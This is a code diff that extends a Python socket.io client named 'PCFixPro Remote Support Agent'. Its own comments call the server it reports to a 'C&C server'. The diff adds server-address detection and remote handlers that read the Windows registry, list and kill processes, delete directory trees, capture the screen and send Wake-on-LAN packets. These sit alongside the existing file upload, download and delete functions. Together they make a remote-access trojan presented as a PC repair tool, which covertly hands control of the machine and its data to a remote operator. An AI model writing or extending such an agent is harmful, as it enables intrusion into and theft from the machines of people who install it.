@@ -15,15 +15,41 @@ from datetime import datetime
 import base64
 from io import BytesIO
 
-# Configuration
+# Configuration - Server IP will be auto-detected or read from config
 SERVER_URL = "http://192.168.100.253:5000"  # Change to your C&C server IP
 AGENT_ID = None
+
+# Auto-detect server URL from environment or local config
+def detect_server_url():
+    """Auto-detect server URL from config file or environment"""
+    # Check for local config file
+    config_paths = [
+        os.path.join(os.path.dirname(__file__), "config.json"),
+        os.path.expanduser("~/.pcfixpro/config.json"),
+        "C:\\PCFixPro\\config.json"
+    ]
+    
+    for config_path in config_paths:
+        if os.path.exists(config_path):
+            try:
+                with open(config_path, 'r') as f:
+                    config = json.load(f)
+                    if 'server_url' in config:
+                        return config['server_url']
+            except:
+                pass
+    
+    # Check environment variable
+    env_url = os.environ.get('PCFIXPRO_SERVER_URL')
+    if env_url:
+        return env_url
+    
+    return SERVER_URL
 
 # Standard library imports
 import socket
 
 HOSTNAME = socket.gethostname()
-LOCAL_IP = socket.gethostbyname(HOSTNAME)
 
 def get_local_ip():
     try:
@@ -57,12 +83,13 @@ class RemoteAgent:
     def __init__(self):
         self.sio = socketio.Client()
         self.agent_id = None
+        self.server_url = detect_server_url()
         self.setup_socket_handlers()
         
     def setup_socket_handlers(self):
         @self.sio.event
         def connect():
-            print(f"[AGENT] Connected to C&C server at {SERVER_URL}")
+            print(f"[AGENT] Connected to C&C server at {self.server_url}")
             # Register with server
             sys_info = get_system_info()
             self.sio.emit('register_agent', sys_info)
@@ -118,7 +145,7 @@ class RemoteAgent:
                     'timestamp': datetime.now().isoformat()
                 }
                 self.sio.emit('command_result', output)
-
+    
         @self.sio.event
         def list_files(data):
             """List files in directory"""
@@ -152,7 +179,7 @@ class RemoteAgent:
                     'error': str(e),
                     'command_id': data.get('command_id')
                 })
-
+        
         @self.sio.event
         def upload_file(data):
             """Upload file to agent"""
@@ -182,7 +209,7 @@ class RemoteAgent:
                     'error': str(e),
                     'command_id': data.get('command_id')
                 })
-
+        
         @self.sio.event
         def download_file(data):
             """Download file from agent"""
@@ -209,7 +236,7 @@ class RemoteAgent:
                     'error': str(e),
                     'command_id': data.get('command_id')
                 })
-
+        
         @self.sio.event
         def delete_file(data):
             """Delete file or directory"""
@@ -218,7 +245,8 @@ class RemoteAgent:
             
             try:
                 if os.path.isdir(file_path):
-                    os.rmdir(file_path)
+                    import shutil
+                    shutil.rmtree(file_path)
                 else:
                     os.remove(file_path)
                 
@@ -233,7 +261,7 @@ class RemoteAgent:
                     'error': str(e),
                     'command_id': data.get('command_id')
                 })
-
+        
         @self.sio.event
         def screenshot(data):
             """Take screenshot"""
@@ -255,24 +283,170 @@ class RemoteAgent:
                         'command_id': data.get('command_id')
                     })
                 except ImportError:
-                    self.sio.emit('screenshot_result', {
-                        'status': 'error',
-                        'error': 'PIL/Pillow not installed',
-                        'command_id': data.get('command_id')
-                    })
+                    # Try mss as fallback
+                    try:
+                        import mss
+                        from PIL import Image
+                        with mss.mss() as sct:
+                            img = sct.grab(sct.monitors[1])
+                            buffered = BytesIO()
+                            Image.frombytes('RGB', img.size, img.rgb).save(buffered, format="PNG")
+                            content_b64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
+                            
+                            self.sio.emit('screenshot_result', {
+                                'status': 'success',
+                                'content': content_b64,
+                                'format': 'png',
+                                'command_id': data.get('command_id')
+                            })
+                    except:
+                        self.sio.emit('screenshot_result', {
+                            'status': 'error',
+                            'error': 'PIL/Pillow not installed',
+                            'command_id': data.get('command_id')
+                        })
             except Exception as e:
                 self.sio.emit('screenshot_result', {
                     'status': 'error',
                     'error': str(e),
                     'command_id': data.get('command_id')
                 })
-    
+        
+        @self.sio.event
+        def read_registry(data):
+            """Read Windows registry"""
+            print(f"[AGENT] Reading registry: {data.get('hive')}\\{data.get('key_path')}")
+            
+            try:
+                import winreg
+                hive_map = {'HKLM': winreg.HKEY_LOCAL_MACHINE, 'HKCU': winreg.HKEY_CURRENT_USER}
+                hive = hive_map.get(data.get('hive'), winreg.HKEY_LOCAL_MACHINE)
+                key_path = data.get('key_path', '')
+                
+                values = {}
+                with winreg.OpenKey(hive, key_path) as key:
+                    for i in range(winreg.QueryInfoKey(key)[1]):
+                        name, value, _ = winreg.EnumValue(key, i)
+                        values[name] = str(value)
+                
+                self.sio.emit('registry_result', {
+                    'status': 'success',
+                    'hive': data.get('hive'),
+                    'key_path': key_path,
+                    'values': values,
+                    'command_id': data.get('command_id')
+                })
+            except Exception as e:
+                self.sio.emit('registry_result', {
+                    'status': 'error',
+                    'error': str(e),
+                    'command_id': data.get('command_id')
+                })
+        
+        @self.sio.event
+        def list_processes(data):
+            """List running processes"""
+            print(f"[AGENT] Listing processes...")
+            
+            try:
+                processes = []
+                if platform.system() == 'Windows':
+                    import wmi
+                    c = wmi.WMI()
+                    for proc in c.Win32_Process():
+                        processes.append({
+                            'pid': proc.ProcessId,
+                            'name': proc.Name,
+                            'cpu': getattr(proc, 'ProcessId', 0),
+                            'memory': 0
+                        })
+                else:
+                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+                    for line in result.stdout.split('\n')[1:]:
+                        parts = line.split()
+                        if len(parts) > 10:
+                            processes.append({
+                                'pid': int(parts[1]),
+                                'name': parts[10],
+                                'cpu': float(parts[2]),
+                                'memory': float(parts[3])
+                            })
+                
+                self.sio.emit('processes_result', {
+                    'status': 'success',
+                    'processes': processes[:100],  # Limit to 100
+                    'command_id': data.get('command_id')
+                })
+            except Exception as e:
+                self.sio.emit('processes_result', {
+                    'status': 'error',
+                    'error': str(e),
+                    'command_id': data.get('command_id')
+                })
+        
+        @self.sio.event
+        def kill_process(data):
+            """Kill process by PID"""
+            pid = data.get('pid')
+            print(f"[AGENT] Killing process PID: {pid}")
+            
+            try:
+                if platform.system() == 'Windows':
+                    subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
+                else:
+                    subprocess.run(['kill', '-9', str(pid)], capture_output=True)
+                
+                self.sio.emit('kill_result', {
+                    'status': 'success',
+                    'pid': pid,
+                    'command_id': data.get('command_id')
+                })
+            except Exception as e:
+                self.sio.emit('kill_result', {
+                    'status': 'error',
+                    'error': str(e),
+                    'command_id': data.get('command_id')
+                })
+        
+        @self.sio.event
+        def wake_on_lan(data):
+            """Send Wake-on-LAN packet"""
+            mac_address = data.get('mac_address')
+            print(f"[AGENT] Sending WoL to: {mac_address}")
+            
+            try:
+                import socket
+                # Parse MAC address
+                mac = mac_address.replace(':', '').replace('-', '')
+                if len(mac) != 12:
+                    raise ValueError("Invalid MAC address format")
+                
+                # Create magic packet
+                packet = bytes.fromhex('F' * 12 + mac * 16)
+                
+                # Send packet
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+                    sock.sendto(packet, ('<broadcast>', 9))
+                
+                self.sio.emit('wol_result', {
+                    'status': 'success',
+                    'mac_address': mac_address,
+                    'command_id': data.get('command_id')
+                })
+            except Exception as e:
+                self.sio.emit('wol_result', {
+                    'status': 'error',
+                    'error': str(e),
+                    'command_id': data.get('command_id')
+                })
+                
     def connect(self):
         """Connect to C&C server with auto-reconnect"""
         while True:
             try:
                 if not self.sio.connected:
-                    self.sio.connect(SERVER_URL, transports=['websocket', 'polling'])
+                    self.sio.connect(self.server_url, transports=['websocket', 'polling'])
                     # Keep alive
                     while self.sio.connected:
                         time.sleep(30)
@@ -286,7 +460,7 @@ class RemoteAgent:
         print(f"[AGENT] Starting Remote Support Agent...")
         print(f"[AGENT] Hostname: {HOSTNAME}")
         print(f"[AGENT] Local IP: {get_local_ip()}")
-        print(f"[AGENT] Connecting to: {SERVER_URL}")
+        print(f"[AGENT] Connecting to: {self.server_url}")
         
         self.connect()
 
